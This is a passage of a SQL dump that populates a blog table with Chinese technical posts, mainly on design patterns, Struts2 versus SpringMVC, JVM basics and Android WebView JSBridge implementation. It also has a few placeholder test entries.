12:20:17', '建造者模式(Builder Pattern)又叫生成器模式,是一种对象构建模式。它可以将复杂对象的建造过程抽象出来,是这个抽象过程的不同实现方法可以构造出不同表现的对象', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200314_120536_200.jpg', '原创', 0, b'1', b'0', '构建者模式', '2020-03-20 12:21:10', 24, 57, 2, 1, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000164, b'0', b'1', '## 一、框架机制\r\n1、Struts2采用Filter（StrutsPrepareAndExecuteFilter）实现,SpringMVC（DispatcherServlet）则采用Servlet实现。\r\n\r\n2、Filter在容器启动之后即初始化；服务停止以后坠毁，晚于Servlet。Servlet在是在调用时初始化，先于Filter调用，服务停止后销毁。\r\n\r\n## 二、拦截机制\r\n**struts:**\r\n\r\n1.Struts2框架是类级别的拦截，每次请求就会创建一个Action\r\n\r\n2.一个Action对应一个request，response\r\n\r\n3.Action的一个方法可以对应一个url，而其类属性却被所有方法共享\r\n\r\n**springmvc:**\r\n\r\n1.SpringMVC是方法级别的拦截，一个方法对应一个Request上下文\r\n\r\n2.SpringMVC的Controller Bean默认单例模式Singleton，所以默认对所有的请求，只会创建一个Controller，又因为没有共享的属性，所以是线程安全的，如果要改变默认的作用域，需要添加@Scope注解修改。\r\n\r\n## 三、性能方面\r\nSpringMVC基于方法的拦截，有加载一次单例模式bean注入。而Struts2是类级别的拦截，每次请求对应实例一个新的Action，需要加载所有的属性值注入，所以，SpringMVC开发效率和性能高于Struts2。\r\n\r\n## 附：\r\n### 拦截器（Interceptor）和过滤器（Filter）的执行顺序和区别\r\n\r\n#### 过滤器(Filter)：\r\n\r\n**因为Filter需要在web.xml中配置，所以依赖于servlet容器。至于为什么在实现上基于函数回调。**\r\n\r\n因为从Filter的 doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) 这个方法中可以看到，FilterChain作为一个参数传递了进来，\r\n当前的字符过滤Filter将字符编码设置好后，调用了FilterChain的 filterChain.doFilter(servletRequest, servletResponse); 让FilterChain去找下一个Filter进行新的处理，如果没有下一个Filter了，就直接放行，访问servlet获取资源。这就是典型的一个函数回调，Filter就相当于类A，FilterChain就相当于类B，类A调用类B。\r\n\r\n**Filter可以对几乎所有请求进行过滤，但是缺点是一个过滤器实例只能在容器初始化时调用一次。**\r\n\r\n通过使用Filter，我们可以用来做一些过滤操作，获取我们想要获取的数据。比如：在Javaweb中，对传入的request、response提前过滤掉一些信息，或者提前设置一些参数，然后再传入servlet或者Controller进行业务逻辑操作。通常用的场景是：在过滤器中修改字符编码（CharacterEncodingFilter）、在过滤器中修改HttpServletRequest的一些参数（XSSFilter(自定义过滤器)），如：过滤低俗文字、危险字符等。\r\n\r\n#### 拦截器（Interceptor）：\r\n\r\n**因为Interceptor需要在SpringMVC中配置，所以依赖于web框架。在实现上,基于Java的反射机制。**\r\n\r\n拦截器可以在方法执行前后进行其他操作，属于面向切面编程（AOP）的一种运用\r\n\r\n由于拦截器是基于web框架的调用，因此可以使用Spring的依赖注入（DI）进行一些业务操作，同时一个拦截器实例在一个controller生命周期之内可以多次调用。**但是缺点是只能对controller请求进行拦截，对其他的一些比如直接访问静态资源的请求则没办法进行拦截处理。**\r\n\r\n#### Filter的执行顺序在Interceptor之前\r\n\r\n\r\n\r\n------------\r\n\r\n\r\n\r\n\r\n**2020-03-20 22:15:02 星期五**', '2020-03-20 22:21:10', 'Struts2采用Filter（StrutsPrepareAndExecuteFilter）实现,SpringMVC（DispatcherServlet）则采用Servlet实现', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200317_221225_32.jpg', '原创', 0, b'1', b'0', 'Struts2和SpringMVC的区别', '2020-03-20 22:24:49', 89, 60, 2, 1, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000165, b'1', b'1', 'test', '2020-04-24 19:56:03', 'test', 'aaaa', '原创', 2, b'1', b'0', 'test1', '2020-04-24 19:56:38', 5, 53, 2, 1, 1, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000167, b'0', b'0', 'test', '2020-04-24 19:58:19', NULL, NULL, NULL, 2, b'0', b'0', 'test', '2020-04-24 19:58:19', 3, NULL, 2, 0, 0, 1, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000168, NULL, NULL, '   #春风吹上厕所商品房角色服务费分为\r\n**色粉为了而非vwr**\r\n![](https://tse2-mm.cn.bing.net/th/id/OIP-C.Qs9k5p-UR_h_QkudqkVaeQHaE8?w=247&h=180&c=7&r=0&o=5&dpr=1.25&pid=1.7)', '2022-07-04 21:53:04', '去WAr则SDGXFHCGVJBNM', 'https://tse2-mm.cn.bing.net/th/id/OIP-C.Qs9k5p-UR_h_QkudqkVaeQHaE8?w=247&h=180&c=7&r=0&o=5&dpr=1.25&pid=1.7', NULL, 0, NULL, NULL, '这是一个标题1111', '2022-07-04 21:53:04', 127, 53, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000169, NULL, NULL, '# 走进JVM\r\nJVM相对于Java应用层的学习难度更大，开篇推荐掌握的预备知识： C/C++(关键)、微机原理与接口技术、计算机组成原理、操作系统、数据结构与算法、编译原理（不推荐刚学完JavaSE的同学学习），如果没有掌握推荐的一半以上的预备知识，可能学习起来会比较吃力。\r\n\r\n		本套课程中需要用到的开发工具： CLion、IDEA、Jetbrains Gateway\r\n\r\n此阶段，我们需要深入探讨Java的底层执行原理，了解Java程序运行的本质。开始之前，推荐各位都入手一本《深入理解Java虚拟机 第三版》这本书对于JVM的讲述非常地详细：\r\n\r\n点击查看图片来源\r\n点击查看图片来源\r\n\r\n\r\n我们在JavaSE阶段的开篇就进行介绍了，我们的Java程序之所以能够实现跨平台，本质就是因为它是运行在虚拟机之上的，而不同平台只需要安装对应平台的Java虚拟机即可运行（在JRE中包含），所有的Java程序都采用统一的标准，在任何平台编译出来的字节码文件(.class)也是同样的，最后实际上是将编译后的字节码交给JVM处理执行。\r\n\r\n点击查看图片来源\r\n点击查看图片来源\r\n\r\n\r\n也正是得益于这种统一规范，除了Java以外，还有多种JVM语言，比如Kotlin、Groovy等，它们的语法虽然和Java不一样，但是最终编译得到的字节码文件，和Java是同样的规范，同样可以交给JVM处理。\r\n\r\n点击查看图片来源\r\n点击查看图片来源\r\n\r\n\r\n所以，JVM是我们需要去关注的一个部分，通过了解Java的底层运作机制，我们的技术会得到质的提升。\r\n\r\n技术概述\r\n首先我们要了解虚拟机的具体定义，我们所接触过的虚拟机有安装操作系统的虚拟机，也有我们的Java虚拟机，而它们所面向的对象不同，Java虚拟机只是面向单一应用程序的虚拟机，但是它和我们接触的系统级虚拟机一样，我们也可以为其分配实际的硬件资源，比如最大内存大小等。\r\n\r\n并且Java虚拟机并没有采用传统的PC架构，比如现在的HotSpot虚拟机，实际上采用的是基于栈的指令集架构，而我们的传统程序设计一般都是基于寄存器的指令集架构，这里我们需要回顾一下计算机组成原理中的CPU结构：\r\n\r\n点击查看图片来源\r\n点击查看图片来源\r\n\r\n\r\n其中，AX，BX，CX，DX 称作为数据寄存器：\r\n\r\nAX (Accumulator)：累加寄存器，也称之为累加器；\r\nBX (Base)：基地址寄存器；\r\nCX (Count)：计数器寄存器；\r\nDX (Data)：数据寄存器；\r\n这些寄存器可以用来传送数据和暂存数据，并且它们还可以细分为一个8位的高位寄存器和一个8位的低位寄存器，除了这些通用功能，它们各自也有自己的一些专属职责，比如AX就是一个专用于累加的寄存器，用的也比较多。\r\n\r\nSP 和 BP 又称作为指针寄存器：\r\n\r\nSP (Stack Pointer)：堆栈指针寄存器，与SS配合使用，用于访问栈顶；\r\nBP (Base Pointer)：基指针寄存器，可用作SS的一个相对基址位置，用它可直接存取堆栈中的数据；\r\nSI 和 DI 又称作为变址寄存器：\r\n\r\nSI (Source Index)：源变址寄存器；\r\nDI (Destination Index)：目的变址寄存器；\r\n主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。\r\n\r\n控制寄存器：\r\n\r\nIP (Instruction Pointer)：指令指针寄存器；\r\nFLAG：标志寄存器；\r\n段寄存器：\r\n\r\nCS (Code Segment)：代码段寄存器；\r\nDS (Data Segment)：数据段寄存器；\r\nSS (Stack Segment)：堆栈段寄存器；\r\nES (Extra Segment)：附加段寄存器；\r\n这里我们分别比较一下在x86架构下C语言和arm架构下编译之后的汇编指令不同之处：\r\n\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n``` int main() {     //实现一个最简的a+b功能，并存入变量c\r\n    int a = 10;\r\n    int b = 20;\r\n    int c = a + b;\r\n    return c;```\r\n	\r\n![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F314515%2F201912%2F314515-20191231163244928-184981058.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1645942605&t=53b5ab5873cf233ff45f9fefb8aa87e8)', '2022-07-04 22:03:03', 'JVM相对于Java应用层的学习难度更大，开篇推荐掌握的预备知识： C/C++(关键)、微机原理与接口技术、计算机组成原理、操作系统、数据结构与算法、编译原理（不推荐刚学完JavaSE的同学学习），如果没有掌握推荐的一半以上的预备知识，可能学习起来会比较吃力。', 'https://tse4-mm.cn.bing.net/th/id/OIP-C.tCVpfxPat2V35_CWG1l5CgHaEq?w=315&h=198&c=7&r=0&o=5&dpr=1.25&pid=1.7', NULL, 0, NULL, NULL, '走进JVM', '2022-07-04 22:03:03', 255, 53, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000170, NULL, NULL, 'aaaaa\r\n![](https://img-blog.csdnimg.cn/img_convert/a68314308cc0cd101bfc44abb176dd10.png)\r\n', '2022-07-05 10:22:32', 'asfasd', 'https://img-blog.csdnimg.cn/img_convert/a68314308cc0cd101bfc44abb176dd10.png', NULL, 0, NULL, NULL, 'sdasdas', '2022-07-05 10:22:32', 31, NULL, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000171, NULL, NULL, '## 背景\r\n\r\n`WebView`作为承载动态页面的容器，在安卓中本身只是一个用于加载`web`页面的视图控件，但`web`页面中常需要与`Native`进行交互动作，比如跳转到一个`Native`页面、弹出一条`Toast`提示、检测设备状态等。\r\n\r\n在更加复杂的情境中：\r\n\r\n- 小程序\r\n\r\n  - 需要根据`web`的需要在`WebView`上覆盖显示一些`Native`控件以提供接近`native`的体验（`input`框、地图等）\r\n  - 提供一些诸如本地储存、定位数据之类的服务供`web`使用（虽然部分走的是`V8`引擎，但仍需要`JSBridge`去进行一些通信）\r\n\r\n- 强\r\n\r\n  ```\r\n  Hybrid\r\n  ```\r\n\r\n  应用\r\n\r\n  - `Native`控件与`web`频繁交互\r\n  - `Native`页面/组件利用`JSBridge`与后端同步数据，简化后端工作量（不需要维护两套通信接口），但过度依赖于`WebView`\r\n    ![img](https://www.viseator.com/images/jsbridge_0.png)\r\n\r\n以上通信的基础设施就是`JSBridge`，`JSBridge`的实现本身并不复杂，可以看作是对系统接口的二次封装。\r\n\r\n\r\n\r\n## 从系统接口说起 *Android\r\n\r\n### Native调用js\r\n\r\n相对来说比较简单，`webview`为我们提供了如下两个接口来执行`js`代码：\r\n\r\n- ```\r\n  api19\r\n  ```\r\n\r\n  之前：\r\n\r\n  ```\r\n  /**\r\n   * Loads the given URL.\r\n   * <p>\r\n   * Also see compatibility note on {@link #evaluateJavascript}.\r\n   *\r\n   * @param url the URL of the resource to load\r\n   */\r\n  public void loadUrl(String url) \r\n  ```\r\n\r\n- ```\r\n  api19\r\n  ```\r\n\r\n  之后（效率更高）：\r\n\r\n  ```\r\n  /**\r\n   * Asynchronously evaluates JavaScript in the context of the currently displayed page.\r\n   * If non-null, |resultCallback| will be invoked with any result returned from that\r\n   * execution. This method must be called on the UI thread and the callback will\r\n   * be made on the UI thread.\r\n   * <p>\r\n   * Compatibility note. Applications targeting {@link android.os.Build.VERSION_CODES#N} or\r\n   * later, JavaScript state from an empty WebView is no longer persisted across navigations like\r\n   * {@link #loadUrl(String)}. For example, global variables and functions defined before calling\r\n   * {@link #loadUrl(String)} will not exist in the loaded page. Applications should use\r\n   * {@link #addJavascriptInterface} instead to persist JavaScript objects across navigations.\r\n   *\r\n   * @param script the JavaScript to execute.\r\n   * @param resultCallback A callback to be invoked when the script execution\r\n   *                       completes with the result of the execution (if any).\r\n   *                       May be null if no notification of the result is required.\r\n   */\r\n  public void evaluateJavascript(String script, ValueCallback<String> resultCallback)\r\n  ```\r\n\r\n  我们只需要构建\r\n\r\n  ```\r\n  javascript:\r\n  ```\r\n\r\n  开头形式的代码字符串传入执行就可以了，以上两个方法都是直接返回的。\r\n\r\n### js调用Native\r\n\r\n实现方式比较多样，先上一张图：\r\n![img](https://www.viseator.com/images/jsbridge_1.png)\r\n\r\n#### shouldOverrideUrlLoading拦截特定schema\r\n\r\n`WebView`提供了`shouldOverrideUrlLoading`方法允许我们拦截`web`页面加载的`url`，我们可以利用这个方法采用加载伪协议的方式进行通信：\r\n\r\n```\r\npublic class CustomWebViewClient extends WebViewClient {\r\n    @Override\r\n    public boolean shouldOverrideUrlLoading(WebView view, String url) {\r\n      ......\r\n       // 截取url并操作\r\n        return true;\r\n      }\r\n      return super.shouldOverrideUrlLoading(view, url);\r\n    }\r\n}\r\n```\r\n\r\n伪协议形式根据业务不同复杂度也不同，后面的工作主要就是围绕这个`scheme`字符串解析/生成。\r\n\r\n在`web`端，采用加载不可见`iframe`的方式传递`url`到`Native`：\r\n\r\n```\r\nfunction openURL (url) {\r\n       var iframe = document.createElement(\'iframe\');\r\n       iframe.style.cssText = \'display:none;width:0px;height:0px;\';\r\n       var container = document.body || document.documentElement;\r\n       container.appendChild(iframe);\r\n       iframe.onload = fail;\r\n       iframe.src = url;\r\n       setTimeout(function() {\r\n           iframe.parentNode.removeChild(iframe);\r\n       }, 0);\r\n   }\r\n```\r\n\r\n但是此方法在测试中存在一个比较严重的问题：无法在短时间内回调多次`shouldOverrideUrlLoading`方法，也就是说频繁交互的情况下，会有较大概率多次`url`跳转只回调一次该方法，在`github`上非常著名的一个`JSBridge`实现中，将消息排队压缩为一个消息，然后使用一个`url`去通知`Native`调用`js`的取消息`Handler`，`js`再将整合后的消息一起发送给`Native`。\r\n\r\n不幸的是，这种方式仍有丢消息的情况，有一笔`pr`修复了该问题，采用了两个`iframe`一个用于通知、一个用于数据传送。但该方式的效率会显著低于以下几种。\r\n\r\n#### onJsPrompt传递数据\r\n\r\n在`js`调用`window`的`window.alert`，`window.confirm`，`window.prompt`三种方法时，`WebView`中注入的`WebChromeClient`对象的对应方法会被调用，并且可以带有`js`传递过来的参数，我们可以选择其中之一作为我们数据传递的通道，由于`promopt`使用频率较低，所以一般采用它作为调用方法。\r\n\r\n```\r\npublic class JSBridgeWebChromeClient extends WebChromeClient {\r\n    @Override\r\n    public boolean onJsPrompt(WebView view, String url, Stringt message, String defaultValue, JsPromptResult result) {\r\n        //对message进行处理\r\n        return true;\r\n    }\r\n}\r\n```\r\n\r\n`js`中只要调用`window.prompt`就可以了：\r\n\r\n```\r\nwindow.prompt(uri, \"\");\r\n```\r\n\r\n数据传递的格式并没有要求，我们可以采用上述的`schema`或者自己另外制定协议。如果出于与`js`保持一致的考虑，就使用`schema`。\r\n\r\n#### console.log传递数据\r\n\r\n与上种方法大同小异，只不过利用的是`js`调用`console.log`时`WebChromeClient`的`onConsoleMessage`回调来处理消息，`js`端只要使用`console.log`就可以了。\r\n\r\n#### addJavascriptInterface注入对象\r\n\r\n`addJavascriptInterface`是`WebView`的一个方法，顾名思义，这个方法是安卓为我们提供的官方实现`JSBridge`的方式，通过它我们可以向`WebView`加载的页面中注入一个`js`对象，`js`可以通过这个对象调用到相应的`Native`方法：\r\n\r\n```\r\n// class for injecting to js\r\nclass Bridge {\r\n    @JavascriptInterface\r\n    fun send(msg: String) {\r\n        doSomething()\r\n    }\r\n}\r\n// inject Bridge as _sBridge\r\nwebview.addJavascriptinterface(Bridge(), \"_sBridge\")\r\n```\r\n\r\n我们创建了一个`Bridge()`对象并作为`_sBridge`注入到了`webview`的当前页面中，在`js`端即可以通过以下形式调用：\r\n\r\n```\r\nwindow._sBridge.send(msg);\r\n```\r\n\r\n该方法是阻塞的，会等待`Native`方法的返回，`Native`会在一个后台线程中执行该方法调用。\r\n关于安全性问题：\r\n在安卓4.2之前通过注入的对象进行反射调用可以执行其他类的一些方法，存在严重安全漏洞，具体见：https://blog.csdn.net/weekendboyxw/article/details/48175027\r\n4.2之后加入了上述的​`@JavascriptInterface`​注解来避免暴露额外的方法，从而解决了这一问题。\r\n\r\n#### 性能测试\r\n\r\n> 测试方法：\r\n> ​> `js`​端收到`​Bridge`​注入完成的事件后，连续触发100次传递消息到`​Native`​的方法调用，传递2w个英文字符作为消息体，在`​Native`​端作处理时分别采用立即返回和延迟10ms返回模拟方法处理耗时。统计`​js`​调用开始到结束的平均时间。\r\n\r\n| 方法                     | 方式立即返回耗时 | 延迟10ms返回耗时     |\r\n| ------------------------ | ---------------- | -------------------- |\r\n| addJavascriptInterface   | 1.2ms            | 13.37ms              |\r\n| shouldOverrideUrlLoading | -                | -                    |\r\n| onJsPrompt               | 1.78ms           | 15.87ms              |\r\n| console.log              | 0.16ms           | 0.16ms（完全不阻塞） |\r\n\r\n`shouldOverrideUrlLoading`方式由于采用队列压缩消息，耗时数据与实际业务中数据收发频率相关，暂不测试，可以认为耗时显著高于其他几种。\r\n\r\n#### 如何选择\r\n\r\n![img](https://www.viseator.com/images/jsbridge_1.png)\r\n从编码角度上看，​`addJavascriptInterface()`​方法实现是最为简洁明了的，同时上表中的速度一栏，在实际测试中发现​`addJavascriptInterface()`​方法耗时比`​onJsPrompt`​要少。\r\n\r\n`console.log()`在10ms延迟测试中由于自身不阻塞的特性，耗时较短，但在实际处理中，会在`addJavascriptInterface()`中另开线程去异步处理消息，延迟时间也非常短。\r\n\r\n综上，使用`addJavascriptInterface`作为`js`向`Native`传递数据的通道是较为合理的选择。如果实在对耗时要求高，可以考虑采用`console.log()`的方式。\r\n\r\n## JSBridge上层实现\r\n\r\n有了上述的双端通信的基础通道，我们就可以基于此去构建一套易用的方法封装。\r\n\r\n### 消息格式\r\n\r\n为了一定程度上兼容`iOS`端的`JSBridge`，我们双端都采用注册`Handler`，以`Handler`名作为方法索引，再使用`json`作为参数数据的序列化/反序列化格式。\r\n下一步解决的问题是如何回调调用方的`​callback`​，我们期望异步调用在完成时被调用方通过回调​`callback`​方法来返回数据。这里采用注册​`Handler`​的思路，在调用方进行调用时，为​`callback`​方法生成一个​`callbackId`​作为`​Key`​来保存这个​`callback`​方法，被调用方完成处理之后，在返回的消息中一并返回`​callbackId`​（这时它变为了​`responseId`​），调用方拿到`​callbackId`​找到对应方法进行回调。\r\n\r\n依此，我们制定的消息格式如下：\r\n\r\n```\r\n{\r\n    \"handlerName\": \"NameOfHandler\",\r\n    \"data\": \"json data\", // 传送给接收方的数据\r\n    \"callbackId\": \"\", // 接收方回调调用方的方法id\r\n    \"responseId\": \"\", // 调用方被回调时收到的方法id，即为发送时的callbackId参数\r\n    \"responseData\": \"json data\" // 接收方返回的数据\r\n}\r\n```\r\n\r\n通信过程可以由下图表示：\r\n\r\n![img](https://www.viseator.com/images/jsbridge_2.png)\r\n\r\n为了兼容`schema`格式，在消息体的基础上添加`schema`头部，组成最终的消息协议：\r\n\r\n```\r\nCUSTOM_PROTOCOL_SCHEME + \'://data/message/\' + messageQueueString\r\n```\r\n\r\n`messageQueueString`为`json`数组，一个`json`元素为一条消息。\r\n\r\n### 双端通信封装\r\n\r\n当`Native`的`WebView`加载页面到80%以上时，会不断尝试将本地的一个`bridge.js`文件注入到`WebView`中，不断尝试是为了解决在弱网状况下一次注入可能失败的问题，`js`代码保证初始化不会重复进行，后续这个文件的代码可以放在前端加载。`bridge.js`负责初始化`LkWebViewJavascriptBridge`类，封装了一些通信的方法和数据对象。\r\n\r\n#### bridge初始化\r\n\r\n`bridge.js`：\r\n\r\n```\r\n...\r\n    var LkWebViewJavascriptBridge = window.LkWebViewJavascriptBridge = {\r\n        init: init,\r\n        send: send,\r\n        registerHandler: registerHandler,\r\n        callHandler: callHandler,\r\n        callSync: callSync,\r\n        _handleMessageFromNative: _handleMessageFromNative,\r\n        debug: true\r\n    };\r\n\r\n    _log(\"local js injected\");\r\n    // notify java\r\n    callHandler(\"s.bridge.ready\", JSON.stringify(\"ready msg from js\"));\r\n    var doc = document;\r\n    var readyEvent = doc.createEvent(\'Events\');\r\n    readyEvent.initEvent(\'LkWebViewJavascriptBridgeReady\');\r\n    readyEvent.bridge = LkWebViewJavascriptBridge;\r\n    doc.dispatchEvent(readyEvent);\r\n```\r\n\r\n1-9行创建了`window.LkWebViewJavascriptBridge`对象，用于访问文件中定义的几个方法（见下文），14行调用`s.bridge.ready`这个`Native`预设的`Handler`，通知`js`端的`Bridge`已完成初始化。随后15-19行触发一个自定义事件，用于通知`web`其他组件`JSBridge`已初始化完成，可以开始通信了。\r\n\r\n#### JS调用Native Handler流程\r\n\r\n```\r\nLkWebViewJavascriptBridge.callHandler(\"java_handler\", \"\\\"js data\\\"\", function (resJson) {\r\n            console.log(\"data callback from java: \")  \r\n            console.log(resJson)\r\n        })\r\n\r\n// js call java handler\r\nfunction callHandler(handlerName, data, responseCallback) {\r\n    _doSend({\r\n        handlerName: handlerName,\r\n        data: data\r\n    }, responseCallback);\r\n}\r\n\r\n// sendMessage add message, 触发native处理 sendMessage\r\nfunction _doSend(message, responseCallback) {\r\n    //        debugger;\r\n    _log(\">>>>>>>>>>> _doSend: \" + message.handlerName + \" \" + time());\r\n\r\n    if (responseCallback) {\r\n        var callbackId = \'cb_\' + uniqueId++ + \'_\' + new Date().getTime();\r\n        responseCallbacks[callbackId] = responseCallback;\r\n        message.callbackId = callbackId;\r\n    }\r\n\r\n    sendMessageQueue.push(message);\r\n    var array = [];\r\n    array.push(message);\r\n    var messageQueueString = JSON.stringify(array);\r\n    window._sBridge.send(CUSTOM_PROTOCOL_SCHEME + \'://data/message/\' + messageQueueString);\r\n\r\n    _log(\"_doSend end <<<<<<<<<<<<<<<:  \" + message.handlerName + \" \" + time());\r\n}\r\n```\r\n\r\n代码逻辑结合上面的消息格式看并不复杂。\r\n\r\n注意到20、21行为`callback`生成了`callbackId`并存入了`responseCallbacks map`中，以便后面回调的处理。\r\n\r\n`window._sBridge.send`即为`Native`通过`addJavascriptInterface`注入的方法，目前只注入了这一个方法用于数据传输。\r\n\r\n这条数据是这样的：\r\n\r\n```\r\ns://data/message/[{\"handlerName\":\"java_handler\",\"data\":\"\\\"js data\\\"\",\"callbackId\":\"cb_1_1534851889294\"}]\r\n```\r\n\r\n`Native`收到`send`调用后，进行如下的事件分发处理：\r\n\r\n```\r\n/**\r\n * handle message from js by call _sBridge.send(msg)\r\n */\r\n@SuppressLint(\"CheckResult\")\r\n@JavascriptInterface\r\nfun send(msg: String) {\r\n    Logger.v(TAG, \"\\n<-----raw msg from js---->\\n$msg\")\r\n    Flowable.just(msg).subscribeOn(sSchedulers.io())\r\n            .filter {\r\n                // filter blank or wrong data\r\n                if (it.isBlank() || !it.startsWith(BridgeUtil.LARK_RETURN_DATA)) {\r\n                    Logger.e(TAG, \"<-----illegal msg from js---->\")\r\n                    return@filter false\r\n                }\r\n                return@filter true\r\n            }.concatMap {\r\n                // separate data from msg\r\n                val data = BridgeUtil.getDataFromReturnUrl(it)\r\n                        ?: throw IllegalStateException(\"can\'t parse message from js\")\r\n                // deserialize Message\r\n                val list: List<Message> = Message.toArrayList(data)\r\n\r\n                return@concatMap if (list.isEmpty()) {\r\n                    Flowable.just(Message())\r\n                } else Flowable.fromIterable(list)\r\n            }.flatMap {\r\n                if (it.responseId.isNullOrBlank()) {\r\n                    // call java handler\r\n                    val callbackFunction = generateJavaCallbackFunction(it.callbackId)\r\n                    val handler = getBridgeHandler(it.handlerName)\r\n                    val action = Action {\r\n                        handler?.handle(it.data, callbackFunction)\r\n                    }\r\n                    when (handler?.getType()) {\r\n                        UI -> {\r\n                            // run on mainThread\r\n                            return@flatMap Flowable.just(action)\r\n                                    .subscribeOn(sSchedulers.mainThread())\r\n                        }\r\n                        BACKGROUND -> {\r\n                            // run on background\r\n                            return@flatMap Flowable.just(action)\r\n                                    .subscribeOn(sSchedulers.io())\r\n                        }\r\n                        else -> {\r\n                            return@flatMap Flowable.empty<Action>()\r\n                        }\r\n                    }\r\n                } else {\r\n                    // response from js\r\n                    val javaCallback = javaCallbacks[it.responseId]\r\n                    if (javaCallback == null) {\r\n                        Logger.i(TAG, \"callback not found for responseId: ${it.responseId}\")\r\n                        return@flatMap Flowable.empty<Action>()\r\n                    } else {\r\n                        return@flatMap Flowable.just(Action {\r\n                            javaCallback.onCallback(it.responseData)\r\n                        }).subscribeOn(sSchedulers.io())\r\n                        // response callback would run on background by default\r\n                    }\r\n                }\r\n            }.subscribe({ it.run() }, {\r\n                Logger.e(TAG, \"handle msg from js error: \", it)\r\n            })\r\n} \r\n```\r\n\r\n代码逻辑如下：\r\n\r\n1. 检查消息的合法性（协议等）\r\n\r\n2. 提取消息体并将消息体反序列化为一个`Message`对象的列表\r\n\r\n3. 判断`responseId`是否为空，如果为空，说明为`JS`对`Handler`的调用，否则为对一条`Native`消息的回调，我们这里是对`s.bridge.ready`的调用\r\n\r\n4. 生成\r\n\r\n   ```\r\n   callback\r\n   ```\r\n\r\n   函数供\r\n\r\n   ```\r\n   handler\r\n   ```\r\n\r\n   调用：\r\n\r\n   ```\r\n   private fun generateJavaCallbackFunction(callbackId: String?): ICallbackFunction {\r\n       return if (callbackId.isNullOrBlank()) {\r\n           object : ICallbackFunction {\r\n               override fun onCallback(data: String?) {\r\n                   // do nothing\r\n               }\r\n           }\r\n       } else {\r\n           object : ICallbackFunction {\r\n               override fun onCallback(data: String?) {\r\n                   // send data back to js\r\n                   val msg = Message(responseData = data, responseId = callbackId)\r\n                   sendToJs(msg)\r\n               }\r\n           }\r\n       }\r\n   }\r\n   ```\r\n\r\n- 可以看到，如果消息中有`callbackId`的话，就会将`handler`传入的消息作为`responseData`，`callbackId`作为`responseId`构建消息发送到`js`以完成回调。\r\n\r\n1. 获取`handler`，这个过程会把注册在一个`map`中的`handler`根据`handlerName`作为`key`取出\r\n\r\n2. 对`handler`类型做判断，目前有两种，一种会运行在主线程，一种会运行在后台线程池\r\n\r\n3. 在对应的线程中调用\r\n\r\n   ```\r\n   handler.handle()\r\n   ```\r\n\r\n   传入\r\n\r\n   ```\r\n   data\r\n   ```\r\n\r\n   和生成的\r\n\r\n   ```\r\n   callbackFunction\r\n   ```\r\n\r\n   作为参数，这样就完成了找到对应\r\n\r\n   ```\r\n   handler\r\n   ```\r\n\r\n   并执行其逻辑的过程，\r\n\r\n   ```\r\n   handler\r\n   ```\r\n\r\n   执行的时候像这样：\r\n\r\n   ```\r\n   override fun handle(data: String?, callback: ICallbackFunction) {\r\n       Toast.makeText(context, data, Toast.LENGTH_LONG).show()\r\n       callback.onCallback(\"{ \\\"data\\\":\\\"callback data from java\\\"}\")\r\n   }\r\n   ```\r\n\r\n- 直接调用`callback`的`onCallback`回传数据就可以了。\r\n\r\n- ```\r\n  onCallback\r\n  ```\r\n\r\n  通过\r\n\r\n  ```\r\n  sendToJs()\r\n  ```\r\n\r\n  方法传递数据到\r\n\r\n  ```\r\n  js\r\n  ```\r\n\r\n  ：\r\n\r\n  ```\r\n  fun sendToJs(msg: Message) {\r\n      var messageJson = msg.toJson()\r\n      // escape special characters for json string\r\n      messageJson = messageJson?.replace(\"(\\\\\\\\)([^utrn])\".toRegex(), \"\\\\\\\\\\\\\\\\$1$2\")\r\n      messageJson = messageJson?.replace(\"(?<=[^\\\\\\\\])(\\\")\".toRegex(), \"\\\\\\\\\\\"\")\r\n      val javascriptCommand = String.format(BridgeUtil.JS_HANDLE_MESSAGE_FROM_JAVA, messageJson)\r\n      doSendJsCommand(javascriptCommand)\r\n  }\r\n  ```\r\n\r\n- 将\r\n\r\n  ```\r\n  Message\r\n  ```\r\n\r\n  进行序列化，同时处理转义字符的问题，然后第6行将消息格式化为一条对\r\n\r\n  ```\r\n  js\r\n  ```\r\n\r\n  的方法调用指令：\r\n\r\n  ```\r\n  const val JS_HANDLE_MESSAGE_FROM_JAVA =\r\n      \"javascript:LkWebViewJavascriptBridge._handleMessageFromNative(\\\"%s\\\");\"\r\n  ```\r\n\r\n- 实际上调用了之前注入的\r\n\r\n  ```\r\n  _handleMessageFromNative\r\n  ```\r\n\r\n  方法，然后调用\r\n\r\n  ```\r\n  doSendJsCommand\r\n  ```\r\n\r\n  执行指令：\r\n\r\n  ```\r\n  private fun doSendJsCommand(javascriptCommand: String) {\r\n      if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\r\n          evaluateJavascript(javascriptCommand, null) // return value not used\r\n      } else {\r\n          loadUrl(javascriptCommand)\r\n      }\r\n  }\r\n  ```\r\n\r\n  现在，消息传递到了\r\n\r\n  ```\r\n  js\r\n  ```\r\n\r\n  的\r\n\r\n  ```\r\n  _handleMessageFromNative()\r\n  ```\r\n\r\n  方法：\r\n\r\n  ```\r\n   // java 调用入口\r\n   function _handleMessageFromNative(messageJSON) {\r\n       if (receiveMessageQueue && receiveMessageQueue.length > 0) {\r\n           receiveMessageQueue.push(messageJSON);\r\n       } else {\r\n           _dispatchMessageFromNative(messageJSON);\r\n       }\r\n   }\r\n  \r\n  // 提供给native使用\r\n   function _dispatchMessageFromNative(messageJSON) {\r\n       _log(\"<-----raw msg from java---->\\n\" + messageJSON);\r\n       (function () {\r\n           var 